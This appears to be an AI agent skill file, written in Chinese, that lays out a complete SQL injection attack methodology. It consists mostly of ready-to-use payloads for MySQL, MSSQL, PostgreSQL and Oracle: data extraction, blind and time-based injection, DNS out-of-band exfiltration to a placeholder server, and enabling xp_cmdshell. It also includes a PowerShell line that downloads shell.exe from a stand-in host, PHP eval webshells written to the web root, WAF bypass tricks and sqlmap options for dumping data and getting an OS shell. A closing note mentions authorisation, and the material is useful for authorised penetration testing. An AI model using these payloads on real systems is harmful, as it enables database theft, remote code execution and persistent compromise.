---
name: sql-injection-testing
description: SQL注入测试的专业技能和方法论，覆盖检测→Union注入→报错注入→盲注→堆叠→读写文件→WAF绕过→SQLMap自动化全流程
---

# SQL注入测试技能

## 概述

SQL注入是最常见且危险的Web应用漏洞。本技能提供系统化的检测方法、利用技术和绕过策略，整合实战Payload与自动化工具。

## 1. 检测方法

### 1.1 手工快速检测

```bash
# 基础闭合测试 (参数值后追加)
'       # 单引号 → 报错 = 可能注入点
"       # 双引号
')      # 括号闭合
")      # 双引号+括号
\;      # 转义符测试 (MSSQL/PostgreSQL)
```

**数字型 vs 字符型判断：**
```
?id=1 AND 1=1      # 正常 → 数字型
?id=1' AND '1'='1  # 正常 → 字符型(单引号)
?id=1" AND "1"="1  # 正常 → 字符型(双引号)
```

### 1.2 HTTP参数位置检测

```
GET参数:    ?id=1'             → URL编码: %27
POST body:  username=admin'    → Content-Type: x-www-form-urlencoded
Cookie:     Cookie: uid=1'     → 常有惊喜
User-Agent: User-Agent: '      → 日志注入 → 二次注入
Referer:    Referer: '         → 同上
JSON:       {"id":"1'"}        → Content-Type: application/json
```

### 1.3 自动化检测

```bash
# SQLMap 全自动检测
sqlmap -u "http://target.com/page.php?id=1" --batch --random-agent

# 指定参数
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id --batch

# POST 请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch

# 从 Burp 文件加载 (推荐)
sqlmap -r request.txt --batch

# 全部参数检测 + 高等级
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
```

## 2. UNION注入 (有回显)

### 2.1 列数探测

```sql
' ORDER BY 1--     # 逐步增加直到报错
' ORDER BY 10--    # 报错 → 列数 = 9
' UNION SELECT NULL--               # 1列
' UNION SELECT NULL,NULL--          # 2列
' UNION SELECT NULL,NULL,NULL--     # 3列...
```

### 2.2 确定回显列位置

```sql
# MySQL/MSSQL
' UNION SELECT 1,2,3,4,5--          # 看页面哪些数字出现

# Oracle (必须带 FROM)
' UNION SELECT 1,2,3,4,5 FROM DUAL--
```

### 2.3 通过回显列读取数据

```sql
# === MySQL ===
' UNION SELECT 1,database(),3,4--           # 当前库名
' UNION SELECT 1,version(),3,4--            # 数据库版本
' UNION SELECT 1,user(),3,4--               # 当前用户
' UNION SELECT 1,@@datadir,3,4--            # 数据目录
' UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata--  # 所有库
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='dbname'--
' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users--

# === MSSQL ===
' UNION SELECT 1,DB_NAME(),3,4--
' UNION SELECT 1,@@VERSION,3,4--
' UNION SELECT 1,STRING_AGG(name,','),3,4 FROM sys.databases--
' UNION SELECT 1,STRING_AGG(name,','),3,4 FROM sys.tables--
```

## 3. 报错注入 (无回显、有报错)

### 3.1 MySQL报错注入

```sql
# extractvalue (最长32字符)
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--

# updatexml
' AND updatexml(1,concat(0x7e,database()),1)--

# 突破32字符限制 — 用substring分段
' AND extractvalue(1,concat(0x7e,substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,32)))--
' AND extractvalue(1,concat(0x7e,substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),33,64)))--

# 重复报错 (双查询/floor报错)
' AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### 3.2 MSSQL报错注入

```sql
' AND 1=convert(int,@@version)--
' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--
```

### 3.3 PostgreSQL报错注入

```sql
' AND 1=CAST(current_database() AS int)--
' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)--
```

## 4. 盲注 (无回显、无报错)

### 4.1 布尔盲注

```sql
# === MySQL ===
# 按位猜库名长度
' AND (SELECT LENGTH(database()))>5--       # 正常 → 长度>5
' AND (SELECT LENGTH(database()))=8--       # 正常 → 长度=8

# 逐字符猜库名
' AND (SELECT SUBSTRING(database(),1,1))='a'--
' AND ASCII(SUBSTRING(database(),1,1))>100--

# 逐行猜表名
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100--

# 猜数据
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>50--
```

### 4.2 时间盲注 (最通用)

```sql
# === MySQL ===
' AND IF(1=1,SLEEP(3),0)--                   # 延时=可注入
' AND IF((SELECT LENGTH(database()))>5,SLEEP(3),0)--

# === MSSQL ===
'; IF (SELECT COUNT(*) FROM sys.databases)>5 WAITFOR DELAY '0:0:3'--

# === PostgreSQL ===
'; SELECT CASE WHEN (SELECT LENGTH(current_database()))>5 THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

### 4.3 DNS带外注入 (OOB)

```sql
# === MySQL DNS带外 (需 root 权限 + secure_file_priv为空) ===
' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.your-dns-server.com\\a.txt')))--

# === MSSQL DNS带外 ===
'; EXEC master.dbo.xp_dirtree '\\\\your-dns-server.com\\a.txt'--

# === Oracle DNS带外 ===
' UNION SELECT UTL_HTTP.REQUEST('http://your-server.com/'||(SELECT banner FROM v$version)) FROM DUAL--
```

## 5. 堆叠注入 (多语句执行)

```sql
# MySQL (需 PHP MySQLi multi_query / Python pymysql)
'; INSERT INTO users VALUES('hacker','pass')--
'; SELECT LOAD_FILE('/etc/passwd')--

# MSSQL (默认支持堆叠)
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

# PostgreSQL
'; SELECT pg_sleep(5)--
'; CREATE TABLE pwn(id int)--
```

## 6. 读写文件

### 6.1 MySQL读写文件

```sql
# === 读文件 (需 FILE 权限) ===
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4--
' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),3,4--

# 判断权限
' UNION SELECT 1,file_priv,3,4 FROM mysql.user WHERE user=user()--

# === 写文件 — 写Webshell (需 secure_file_priv为空 或 可写目录) ===
' UNION SELECT 1,'<?php @eval($_POST[1]);?>',3,4 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b315d293b3f3e,3,4 INTO DUMPFILE '/var/www/html/shell.php'--  # hex编码防转义

# 查看 secure_file_priv 值
' UNION SELECT 1,@@secure_file_priv,3,4--
```

### 6.2 MSSQL命令执行

```sql
# 启用 xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

# 执行命令
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://yourserver/shell.exe -OutFile C:\temp\shell.exe"'--
'; EXEC xp_cmdshell 'type C:\Windows\win.ini'--
```

## 7. WAF绕过 (SQL注入专用)

### 7.1 关键字绕过

```sql
# 大小写
SELECT → SeLeCt / Select / sElEcT

# 内联注释 (MySQL)
SELECT → /*!50000SELECT*/
UNION  → /*!50000UNION*/

# 双写 (简单WAF)
UNION → UNIUNIONON
FROM  → FRFROMOM

# 等价替换
AND → &&
OR  → ||
=   → LIKE / REGEXP / BETWEEN
空格 → /**/ / %09 / %0a / %0d / %0c / +
```

### 7.2 函数绕过

```sql
# sleep → benchmark
SLEEP(5) → BENCHMARK(5000000,MD5(1))

# information_schema → 无列名注入 (MySQL 5.7+)
' UNION SELECT 1,group_concat(table_name),3 FROM mysql.innodb_table_stats WHERE database_name=schema()--

# information_schema → sys schema (MySQL 5.7+)
' UNION SELECT 1,group_concat(table_name),3 FROM sys.schema_table_statistics WHERE table_schema=database()--
```

### 7.3 等价函数速查表

| 原始 | 绕过 |
|------|------|
| `MID(str,1,1)` | `SUBSTRING(str,1,1)` / `SUBSTR(str,1,1)` / `LEFT(str,1)` |
| `ASCII('a')` | `ORD('a')` / `UNICODE('a')` |
| `LIMIT 0,1` | `LIMIT 1 OFFSET 0` |
| `COUNT(*)` | `COUNT(1)` / `COUNT(id)` |
| `SLEEP(5)` | `BENCHMARK(100000000,MD5(1))` |
| `@@version` | `VERSION()` |
| `@@datadir` | `@@GLOBAL.datadir` |

### 7.4 编码绕过

| 编码类型 | 示例 | 适用场景 |
|----------|------|----------|
| 双重URL编码 | `%2527` → `%27` → `'` | 云WAF未递归解码 |
| Unicode规范化 | `U+FF07` (全角单引号) | 某些数据库自动转换 |
| 十六进制 | `0x73656c656374` → `select` | 替换关键字 |

### 7.5 HTTP参数污染 (HPP)

```
GET /search.php?id=1&id=2 UNION SELECT 1,2,3 HTTP/1.1
# ASP/IIS：拼接两个值 "1,2 UNION SELECT"
# PHP：取最后一个值 "2 UNION SELECT"
```

## 8. SQLMap常用参数

```bash
# === 基础 ===
sqlmap -u "URL" --batch --random-agent                    # 自动化
sqlmap -u "URL" --dbs                                     # 列库
sqlmap -u "URL" -D dbname --tables                        # 列表
sqlmap -u "URL" -D dbname -T users --columns              # 列字段
sqlmap -u "URL" -D dbname -T users -C user,pass --dump    # 拖数据

# === 高级 ===
sqlmap -u "URL" --os-shell                                # 系统SHELL (需权限)
sqlmap -u "URL" --file-read "/etc/passwd"                 # 读文件
sqlmap -u "URL" --file-write "shell.php" --file-dest "/var/www/html/shell.php"  # 写文件
sqlmap -u "URL" --tamper=space2comment,randomcase         # tamper绕过

# === 常用tamper ===
# space2comment   → 空格替换为 /**/
# randomcase      → 随机大小写
# charencode      → URL编码
# between         → > < 替换为 BETWEEN
# charunicodeencode → Unicode编码

# === 请求模板 ===
sqlmap -r request.txt --batch --level=3                   # 从文件加载
sqlmap -r request.txt --batch --level=5 --risk=3 --tamper=space2comment,randomcase  # 全开
```

## 9. 各数据库特征速查

| 特征 | MySQL | MSSQL | PostgreSQL | Oracle |
|------|-------|-------|------------|--------|
| 注释 | `--` `#` `/**/` | `--` `/**/` | `--` `/**/` | `--` `/**/` |
| 字符串连接 | `CONCAT()` / `\|\|` | `+` | `\|\|` | `\|\|` |
| 版本函数 | `@@version` `VERSION()` | `@@VERSION` | `VERSION()` | `v$version` |
| 库/用户 | `database()` `user()` | `DB_NAME()` `SYSTEM_USER` | `current_database()` `current_user` | `SYS.DATABASE_NAME` |
| 元数据表 | `information_schema` | `information_schema` | `information_schema` | `ALL_TABLES` |
| 报错注入 | extractvalue/updatexml/floor | convert/子查询 | CAST | CTXSYS/UTL_INADDR |
| 堆叠查询 | 需多语句支持 | 原生支持 | 原生支持 | 有限支持 |
| 命令执行 | UDF/OUTFILE | xp_cmdshell | COPY/程序语言 | Java存储过程 |
| DNS带外 | LOAD_FILE | xp_dirtree/xp_subdirs | 需dblink扩展 | UTL_HTTP/UTL_INADDR |

## 10. 决策树

```
发现URL含参数/表单/JSON输入
  ├─ 手工: 追加 ' " ') → 看报错/响应差异
  │   ├─ 有报错回显 → 报错注入 (extractvalue/updatexml/convert)
  │   ├─ 有数据回显 → UNION注入
  │   ├─ 无回显无报错 → 布尔盲注 → 不行 → 时间盲注
  │   └─ 堆叠查询可用 → 直接命令执行
  ├─ 自动: sqlmap -u URL --batch
  │   ├─ 被WAF拦截 → --tamper=space2comment,randomcase --random-agent
  │   ├─ 需登录 → -r request.txt (从Burp复制)
  │   └─ POST/JSON → --data 或 -r 文件
  └─ 确认注入后
      ├─ MySQL → 读文件(LOAD_FILE) / 写Webshell(INTO OUTFILE)
      ├─ MSSQL → xp_cmdshell 命令执行
      ├─ PostgreSQL → COPY 命令执行
      └─ Oracle → UTL_HTTP 带外
```

## 安全提示

- 🚫 sqlmap 默认参数较慢，可按需调整 --level/--risk
- 🚫 生产环境谨慎使用 --os-shell 等危险参数
- 🚫 被WAF拦截时不要暴力尝试，换tamper组合
- ✅ PoC仅做验证，读取少量数据证明可行性即可
- ✅ 发现致命/高危漏洞立即停止深入利用，先确认授权

---

*参考: OWASP SQL Injection Cheat Sheet + PayloadAllTheThings + 实战案例整理*
